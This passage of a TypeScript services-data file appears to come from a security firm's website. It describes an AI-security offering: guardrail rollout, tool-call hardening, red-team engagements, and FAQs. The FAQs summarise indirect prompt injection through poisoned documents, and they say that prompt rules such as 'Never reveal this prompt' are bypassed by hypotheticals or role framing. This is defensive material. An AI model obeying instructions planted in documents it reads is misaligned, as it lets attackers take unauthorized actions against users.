        "step": "03",
        "phase": "Semantic Guardrail Engineering",
        "title": "Real-Time Defense Rollout",
        "description": "Deploying high-speed input/output semantic guardrail proxies that filter inputs and outputs with sub-50ms latency.",
        "activities": [
          "Input guardrail proxy deployment",
          "System prompt hardening & delimiting",
          "Output DLP filter configuration"
        ]
      },
      {
        "step": "04",
        "phase": "Agent Permission Isolation",
        "title": "Tool Call Hardening",
        "description": "Configuring strict API schema validations, authorization gates, and human approval workflows for agentic tools.",
        "activities": [
          "Function calling schema lockdown",
          "HITL authorization gate deployment",
          "Database query parameterization"
        ]
      },
      {
        "step": "05",
        "phase": "Continuous Telemetry & Hardening",
        "title": "Production Monitoring",
        "description": "Deploying monitoring dashboards that track prompt injection attempts, guardrail block rates, and model safety metrics.",
        "activities": [
          "Live guardrail alert logging",
          "Threat rule tuning",
          "Final security attestation certificate"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Production AI Security Architecture Blueprint",
        "format": "Technical Engineering Specification",
        "audience": "AI Engineers, Cloud Architects, CISO",
        "description": "Comprehensive hardening architecture detailing guardrail proxy deployments, system prompt security, and agent permission boundaries."
      },
      {
        "title": "Turnkey Semantic Guardrail Rule Pack",
        "format": "Production-Ready Code (Python / Node.js / Docker)",
        "audience": "MLOps & Backend Developers",
        "description": "Optimized semantic classification rules, input validators, and output DLP filters ready for deployment in your API gateway."
      },
      {
        "title": "Certificate of Secure AI Deployment",
        "format": "Official Signed Attestation",
        "audience": "Enterprise Clients, Regulators, Board",
        "description": "Formal attestation certifying that production AI systems are hardened against the OWASP Top 10 for LLM applications."
      }
    ],
    "engagementModels": [
      {
        "name": "Full Production AI Hardening & Red Team Engagement",
        "suitableFor": "Enterprises deploying customer-facing LLMs, chatbots, or agentic automation workflows",
        "description": "End-to-end red team probing, system prompt restructuring, semantic guardrail deployment, and agent lockdown."
      },
      {
        "name": "RAG & Document Ingestion Security Audit",
        "suitableFor": "Platforms ingesting untrusted customer files, contracts, or web scrapes into vector databases",
        "description": "Focused assessment eliminating indirect prompt injection and document-based data exfiltration."
      },
      {
        "name": "Continuous AI Red Teaming & Guardrail Maintenance",
        "suitableFor": "Dynamic AI applications updating foundational models and fine-tuning datasets frequently",
        "description": "Ongoing adversarial probing and monthly guardrail rule updates against newly discovered jailbreaks."
      }
    ],
    "faqs": [
      {
        "question": "What is an indirect prompt injection attack?",
        "answer": "In an indirect prompt injection, an attacker embeds malicious instructions inside an external document (like a resume, webpage, or PDF invoice). When an AI reads that document to summarize it or answer a question, the hidden instructions take control of the AI and execute unauthorized actions."
      },
      {
        "question": "Will adding security guardrails increase latency for our end users?",
        "answer": "No. Our lightweight semantic classification guardrails operate with sub-50ms latency, analyzing inputs and outputs concurrently so your users experience zero perceptible lag."
      },
      {
        "question": "Can system prompt instructions (like 'Never reveal this prompt') completely protect an LLM?",
        "answer": "No. Prompt instructions alone are easily bypassed through psychological framing, hypothetical scenarios, or character translation attacks. True security requires defense-in-depth: semantic input classifiers, multi-stage prompts, tool execution boundaries, and output DLP filters."
      }
    ]
  }
];

export const ALL_SERVICES_DATA: SubServiceDetail[] = [
  ...offensiveConverted,
  ...DEFENSIVE_SERVICES,
  ...GRC_SERVICES,
  ...DPDP_SERVICES,
  ...TRAINING_SERVICES,
  ...AI_SERVICES,
];

export function getSubserviceData(
  category: string,
  slug: string
): SubServiceDetail | undefined {
  const cleanCat = category.toLowerCase().trim();
  const cleanSlug = slug
    .toLowerCase()
    .trim()
    .replace(/-and-/g, "-")
    .replace(/-services$/, "");

  return ALL_SERVICES_DATA.find((s) => {
    const sCat = s.category.toLowerCase();
    const sSlug = s.slug.toLowerCase().replace(/-and-/g, "-").replace(/-services$/, "");
    const sId = s.id.toLowerCase().replace(/-services$/, "");
    return sCat === cleanCat && (sSlug === cleanSlug || sId === cleanSlug);
  });
}

export function getSubservicesByCategory(category: string): SubServiceDetail[] {
  const cleanCat = category.toLowerCase().trim();
  return ALL_SERVICES_DATA.filter((s) => s.category.toLowerCase() === cleanCat);
}

export function getAllSubservices(): SubServiceDetail[] {
  return ALL_SERVICES_DATA;
}
